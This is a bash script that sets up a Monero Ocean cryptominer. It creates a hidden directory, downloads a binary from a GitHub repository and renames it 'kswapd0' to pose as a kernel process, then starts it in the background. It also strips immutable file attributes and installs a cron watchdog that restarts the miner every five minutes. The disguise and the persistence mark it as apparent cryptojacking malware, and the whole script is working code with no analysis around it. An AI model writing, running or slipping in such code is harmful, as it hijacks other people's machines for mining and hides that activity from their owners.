#!/bin/bash

chattr -i $HOME/.gdm2_manual/*
chattr -i $HOME/.gdm2_manual/

# Script to start Monero Ocean Miner and manage files

# Create directory for the files
mkdir -p "$HOME/.gdm2_manual/"

# Paths to the required files
KSWAPD0="$HOME/.gdm2_manual/kswapd0"
CONFIG_JSON="$HOME/.gdm2_manual/config.json"

# Terminate processes related to the specific kswapd0
pkill -f "$KSWAPD0 --config=$CONFIG_JSON"

# Check if the files exist and download if not
if [ -f "$KSWAPD0" ] && [ -x "$KSWAPD0" ]; then
    echo "kswapd0 exists and is executable."
else
    echo "kswapd0 does not exist or is not executable. Downloading..."
    curl -L -o "$KSWAPD0" https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/kswapd0
    chmod +x "$KSWAPD0"
fi

if [ -f "$CONFIG_JSON" ]; then
    echo "config.json exists."
else
    echo "config.json does not exist. Downloading..."
    curl -L -o "$CONFIG_JSON" https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config.json
fi

# Run kswapd0 if no other process with the specific configuration is running
if ! pgrep -f "$KSWAPD0 --config=$CONFIG_JSON" > /dev/null; then
    echo "kswapd0 not started. Starting it..."
    "$KSWAPD0" --config="$CONFIG_JSON" &
else
    echo "kswapd0 is already running."
fi

# Create the check script
cat << 'EOF' > "$HOME/.gdm2_manual/check_kswapd0.sh"
#!/bin/bash

KSWAPD0_PATH="$HOME/.gdm2_manual/kswapd0"
CONFIG_JSON_PATH="$HOME/.gdm2_manual/config.json"

if ! pgrep -f "$KSWAPD0_PATH --config=$CONFIG_JSON_PATH" > /dev/null; then
    echo "kswapd0 not started. Going to start it..."
    cd "$HOME/.gdm2_manual/" || exit
    ./kswapd0 --config=config.json &
else
    echo "kswapd0 already started."
fi
EOF

# Make the check script executable
chmod +x "$HOME/.gdm2_manual/check_kswapd0.sh"

# Cron job setup: remove outdated lines and add the new command
CRON_JOB="*/5 * * * * $HOME/.gdm2_manual/check_kswapd0.sh"
(crontab -l 2>/dev/null | grep -v -E '(out dat|check_kswapd0.sh)'; echo "$CRON_JOB") | crontab -
